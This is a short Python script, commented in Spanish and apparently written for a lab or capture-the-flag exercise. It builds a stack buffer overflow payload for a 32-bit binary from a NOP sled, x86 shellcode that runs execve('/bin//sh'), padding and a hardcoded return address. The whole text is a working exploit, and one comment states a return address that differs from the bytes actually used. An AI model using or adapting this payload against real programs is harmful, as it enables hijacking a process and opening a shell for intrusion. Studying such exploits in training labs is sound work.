import sys

# Shellcode para execve("/bin//sh") - 24 bytes
shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x89\xe1\xb0\x0b\xcd\x80")

# Relleno NOP (140 - 24 = 116 bytes)
# Usaremos solo 110 NOPs para dejar 6 bytes extra al final del shellcode (menos riesgo de corrupción)
NOP_sled_len = 110 

# EIP Target (Apunta a un punto seguro: 0xffffce90)
EIP_target = b"\x8e\xce\xff\xff" 

# Payload: NOPs (110) + Shellcode (24) + NOPs/Padding Extra (6) + EIP (4)
# Total de relleno: 110 + 6 = 116 bytes. Total de payload: 144 bytes.
payload = b"\x90" * NOP_sled_len + shellcode + b"\x90" * 6 + EIP_target

sys.stdout.buffer.write(payload)
